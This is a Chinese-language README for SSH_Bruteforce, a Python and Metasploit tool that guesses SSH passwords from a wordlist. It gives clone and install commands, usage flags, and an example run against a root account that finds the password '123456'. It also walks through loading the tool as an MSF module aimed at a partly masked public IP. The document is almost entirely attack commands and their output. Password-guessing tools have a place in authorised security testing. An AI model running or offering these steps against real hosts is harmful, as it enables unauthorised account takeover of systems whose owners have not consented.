# SSH_Bruteforce

运行方式：终端下运行脚本，或在MSF中作为模块运行

### 获取项目

```Bash
git clone https://github.com/HZzz2/SSH_Bruteforce
```



#### 进入目录和安装第三方库

```Bash
cd SSH_Bruteforce
pip install paramiko
```

#### 获取帮助

```Bash
python SSH_Bruteforce.py -h
```

```text
usage: SSH_Bruteforce.py [-h] -H HOST -u USER -f FILE -t THREAD

exmple: python3 SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10

optional arguments:

  -h, --help            show this help message and exit

  -H HOST, --host HOST  Hostname/IP       要爆破的主机IP

  -u USER, --user USER  Username          SSH用户名

  -f FILE, --file FILE  Password file     密码字典

  -t THREAD, --thread THREAD              线程数
    Thread number
```

### 1.Python脚本运行

#### 执行脚本

```Bash
python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 9
```

```text
[-] 123221 is not correct
[-] 442342 is not correct
[-] 842482 is not correct
[-] 524253 is not correct
[-] 224224 is not correct
[-] 724731 is not correct
[+] 123456 is correct
SSH PassWord：123456
```

出现paramiko ssh banner错误不影响程序运行(线程过高的原因，推荐不高于10线程)

### 2.MSF模块运行

#### 将MSF模块复制到根目录下

```Bash
cp MyModules / -r
```

#### 给模块添加执行权限

```Bash
└─# chmod 755 /MyModules/modules/auxiliary/scanner/ssh/MSF_SSH_Bruteforce.py
```

#### 启动MSF

```Bash
msfdb run
```

#### 加载模块目录并使用

```Bash
msf6 > loadpath /MyModules/modules 
msf6 > use auxiliary/scanner/ssh/MSF_SSH_Bruteforce 

```

#### 设置相关参数

![image](https://user-images.githubusercontent.com/22775890/169562446-ced93cb7-f00a-484b-95d6-00363bce6175.png)

![](https://secure2.wostatic.cn/static/wA1FZ6QopMaBmytmgyKxAc/image.png)

```Bash
msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set rhosts 7.XX.XX.18
msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set user_name rXXt
msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > set file /usr/share/commix/src/txt/passwords_john.txt
```

#### 运行模块

```Bash
msf6 auxiliary(scanner/ssh/MSF_SSH_Bruteforce) > exploit 
```

![image](https://user-images.githubusercontent.com/22775890/169562481-7db5eeda-7c17-4a6e-a73b-8fd7f7bd869b.png)

![](https://secure2.wostatic.cn/static/3ucRjDEUCpQyWJ7n6S8RD/image.png)

